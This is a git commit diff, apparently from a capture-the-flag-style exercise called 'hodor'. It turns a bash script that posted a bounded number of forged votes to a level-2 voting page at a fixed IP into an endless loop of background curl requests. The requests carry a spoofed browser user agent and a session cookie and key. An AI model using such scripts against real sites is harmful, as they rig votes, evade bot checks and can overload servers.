d4b4d5867cf2559c5bb1caffabeba2d672afc224
butcallmejo <josquin.gaillard@gmail.com>
2016-06-01 13:34:20 -0700

    allows for hodor_fast to run faster and in background

--- hodor/level_2/hodor_fast_2.sh
+++ hodor/level_2/hodor_fast_2.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-for i in `seq 1 1024`
+while :
 do
-	curl 'http://173.246.108.142/level2.php' -H 'Cookie: HoldTheDoor=ca9edae8e687606348680a5c6e4c7ea10b60fa74' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' -H 'Connection: keep-alive' --data 'id=13&holdthedoor=Submit&key=ca9edae8e687606348680a5c6e4c7ea10b60fa74' --compressed
+	curl 'http://173.246.108.142/level2.php' -H 'Cookie: HoldTheDoor=ca9edae8e687606348680a5c6e4c7ea10b60fa74' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level2.php' -H 'Connection: keep-alive' --data 'id=13&holdthedoor=Submit&key=ca9edae8e687606348680a5c6e4c7ea10b60fa74' --compressed &
 done
